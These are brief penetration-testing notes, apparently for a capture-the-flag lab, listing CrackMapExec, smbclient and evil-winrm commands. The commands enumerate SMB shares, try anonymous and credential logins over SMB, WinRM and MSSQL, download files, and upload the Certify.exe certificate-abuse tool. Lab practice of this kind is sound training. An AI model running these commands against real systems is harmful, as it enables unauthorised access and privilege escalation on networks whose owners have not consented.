
# Get DNS & Domain from nmap
# cme smb
- Get hostname (add hostname.domain & hostname to etc/hosts)
```
cme smb 10.10.11.187
cme smb 10.10.11.187 --shares
cme smb 10.10.11.187 -u 'DoesNotExist' -p '' --shares
cme winrm 10.10.11.187 -u 'publicuser' -p 'password1'
cme mssql 10.10.11.187 --local-auth -u 'publicuser' -p 'password1' -L
smbclient -L //10.10.11.187/Public       (where Public is the share)
smbclient -N //10.10.11.187/Public       (-N for no password)
get "file.pdf"                           (download file from smb)
```


# evil-winrm
```
evil-winrm -i 10.10.14.6 -u 'sql_user' -p 'password'
upload Certify.exe
```